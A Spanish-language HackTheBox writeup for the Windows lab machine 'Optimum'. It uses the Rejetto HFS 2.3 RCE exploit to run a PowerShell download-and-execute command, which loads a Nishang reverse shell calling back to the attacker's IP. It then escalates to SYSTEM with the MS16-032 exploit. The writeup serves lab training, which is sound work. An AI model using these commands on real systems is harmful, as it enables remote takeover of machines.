---
layout: single
title: Writeup HTB - Maquina Optimum
comments: true
excerpt: "La maquina Optimum es una maquina windows - Easy, tenemos una pagina web que esta usando una aplicacion llamada HttpFileServer 2.3, encontramos un exploit para esta esta version de aplicacion que nos permite ejecutar comandos obteniendo una reverse shell con el usuario kostas. Por ultimo escalamos privilegios usando un exploit de kernel MS16032"
date: 2022-02-13
classes: wide
header:
  teaser: /assets/images/2022-02-13-writeup-maquina-htb-optimum/Untitled.png
  teaser_home_page: true
categories:
  - HackTheBox
tags:
  - OSCP  
  - Hacking
  - Windows
  - Easy
---

# Optimum
<p align="center">
<img src="/assets/images/2022-02-13-writeup-maquina-htb-optimum/Untitled.png">
</p>

## Resumen
<div style="text-align: justify">
La maquina Optimum es una maquina windows - Easy, tenemos una pagina web que esta usando una aplicacion llamada HttpFileServer 2.3, encontramos un exploit para esta esta version de aplicacion que nos permite ejecutar comandos obteniendo una reverse shell con el usuario kostas. Por ultimo escalamos privilegios usando un exploit de kernel MS16032
</div>

## Scan Nmap

```bash
# Nmap 7.92 scan initiated Wed Feb 16 17:24:35 2022 as: nmap -sC -sV -p80 -oN targeted -Pn -vvv 10.129.142.187
Nmap scan report for 10.129.142.187
Host is up, received user-set (0.18s latency).
Scanned at 2022-02-16 17:24:36 -05 for 11s

PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 HttpFileServer httpd 2.3
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 16 17:24:47 2022 -- 1 IP address (1 host up) scanned in 12.09 seconds
```

## Pagina web - Puerto 80

ya que tenemos solo un puerto, revisamos la web y vemos que usa una aplicacion HttpFileServer 2.3 también conocido como HFS, es un servidor web gratuito

![Untitled](/assets/images/2022-02-13-writeup-maquina-htb-optimum/Untitled%201.png)

buscamos un exploit relacionado a esta aplicacion

```bash
Optimum # ❯ searchsploit HttpFileServer
---------------------------------------------------------------- ---------------------------------
 Exploit Title                                                  |  Path
---------------------------------------------------------------- ---------------------------------
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)     | windows/webapps/49125.py
---------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

descargamos el exploit

```bash
Optimum # ❯ searchsploit -m 49125      
  Exploit: Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)
      URL: https://www.exploit-db.com/exploits/49125
     Path: /usr/share/exploitdb/exploits/windows/webapps/49125.py
File Type: Python script, UTF-8 Unicode text executable

Copied to: /home/abeljm/Documentos/Plataformas/htb/Optimum/49125.py
```
intento ver si puedo ejecutar comandos pero sin exito

![Untitled](/assets/images/2022-02-13-writeup-maquina-htb-optimum/Untitled%202.png)

pero veo que el creador del exploit da un ejemplo como ejecutar comandos poniendo la ruta de powershell

```bash
Optimum # ❯ python3 49125.py 10.129.142.187 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe ping 10.10.14.70"
```

![Untitled](/assets/images/2022-02-13-writeup-maquina-htb-optimum/Untitled%203.png)

en nuestra maquina descargaremos Invoke-PowerShellTcp.ps1 y agregaremos a la ultima linea el siguiente comando para obtener una reverse shell

```bash
Optimum # ❯ wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
--2022-02-16 18:42:57--  https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.108.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 4339 (4,2K) [text/plain]
Grabando a: «Invoke-PowerShellTcp.ps1»

Invoke-PowerShellTcp.ps1    100%[===========================================>]   4,24K  --.-KB/s    en 0,002s  

2022-02-16 18:42:57 (1,74 MB/s) - «Invoke-PowerShellTcp.ps1» guardado [4339/4339]

Optimum # ❯ echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.70 -Port 443" >> Invoke-PowerShellTcp.ps1
```

dejamos el puerto 443 en escucha con netcat

```bash
Optimum # ❯ rlwrap nc -nlvp 443        
listening on [any] 443 ...
```

tambien creamos un servidor web de python

```bash
Optimum # ❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

y ejecutamos el exploit que encontramos de la siguiente manera

```bash
Optimum # ❯ python3 49125.py 10.129.142.187 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.14.70/Invoke-PowerShellTcp.ps1')"
```

obtenemos una reverse shell exitosa

![Untitled](/assets/images/2022-02-13-writeup-maquina-htb-optimum/Untitled%204.png)

## Escalacion de Privilegios

ejecutamos el comando systeminfo para conocer mas sobre esta maquina y vemos que estamos en una maquina Microsoft Windows Server 2012 R2 Standard x64

```bash
PS C:\Users\kostas\Desktop> 
systeminfo

Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 ??
System Boot Time:          23/2/2022, 9:05:26 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2295 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.264 MB
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 4.643 MB
Virtual Memory: In Use:    860 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM
Hotfix(s):                 31 Hotfix(s) Installed.
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189
                           [05]: KB2928120
                           [06]: KB2931358
                           [07]: KB2931366
                           [08]: KB2933826
                           [09]: KB2938772
                           [10]: KB2949621
                           [11]: KB2954879
                           [12]: KB2958262
                           [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.142.187
                                 [02]: fe80::7423:642e:c4ad:3162
                                 [03]: dead:beef::7423:642e:c4ad:3162
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

### Windows Exploit Suggester

para encontrar un exploit relacionado a la version de windows que tenemos usaremos la herramienta windows exploit suggester y los pasos instalar dicha herramienta es la siguiente

```bash
Optimum # ❯ git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git 
Optimum # ❯ cd Windows-Exploit-Suggester
Windows-Exploit-Suggester # ❯ python2 windows-exploit-suggester.py --update                                
[*] initiating winsploit version 3.3...
[+] writing to file 2022-02-16-mssb.xls
[*] done
Windows-Exploit-Suggester # ❯ pip install xlrd==1.2.0
```

una vez hecho los pasos anteriores ejecutamos windows exploit suggester

```bash
Windows-Exploit-Suggester # ❯ python2 windows-exploit-suggester.py -i systeminfo.txt -d 2022-02-16-mssb.xls 
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 31 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
[*] there are now 246 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2012 R2 64-bit'
[*] 
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*] 
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[*] 
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
[*]   https://github.com/foxglovesec/RottenPotato
[*]   https://github.com/Kevin-Robertson/Tater
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
[*] 
[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
[*] 
[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
[*] 
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
[*] 
[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC

[snip]
```

### MS16-032

segun los datos que nos arrojo windows exploit suggester, descargamos en nuestra maquina el exploit de ms16-032

```bash
Optimum # ❯ wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1
```

dejamos el puerto 443 en escucha con netcat

```bash
Optimum # ❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
```

aprovechamos que tenemos un servidor web en python em nuestra maquina local y ejecutamos esto en la maquina victima

```bash
PS C:\Users\kostas\Desktop> IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.70/Invoke-MS16032.ps1')
PS C:\Users\kostas\Desktop> Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.70/Invoke-PowerShellTcp.ps1')"
```

obteniendo una reverse shell exitosa con privilegios de nt authority system

![Untitled](/assets/images/2022-02-13-writeup-maquina-htb-optimum/Untitled%205.png)

gracias por leer este writeup, nos vemos AbelJM